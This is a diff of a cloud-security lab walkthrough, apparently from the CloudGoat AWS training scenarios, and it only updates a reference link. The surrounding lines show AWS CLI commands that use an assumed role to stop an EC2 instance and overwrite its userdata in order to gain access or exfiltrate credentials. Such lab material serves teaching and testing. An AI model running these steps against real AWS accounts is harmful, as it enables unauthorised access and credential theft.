@@ -41,7 +41,7 @@ aws sts assume-role --role-arn arn:aws:iam::<account_id>:role/cg_ec2_management_
 aws ec2 stop-instances --region us-west-2 --profile cg_ec2_management_role --instance-ids <instance_id>
 ```
 
-### Use the cg_ec2_management_role to modify the userdata to access the EC2 or exfiltrate credentials from it (https://hackingthe.cloud/aws/exploitation/local-priv-esc-mod-instance-att/)
+### Use the cg_ec2_management_role to modify the userdata to access the EC2 or exfiltrate credentials from it ([https://hackingthe.cloud/aws/exploitation/local-priv-esc-mod-instance-att/](https://hackingthe.cloud/aws/exploitation/local_ec2_priv_esc_through_user_data/))
 ```
 aws ec2 modify-instance-attribute --region us-west-2 --profile cg_ec2_management_role --instance-id <instance_id> --user-data file://userdata.txt
 ```
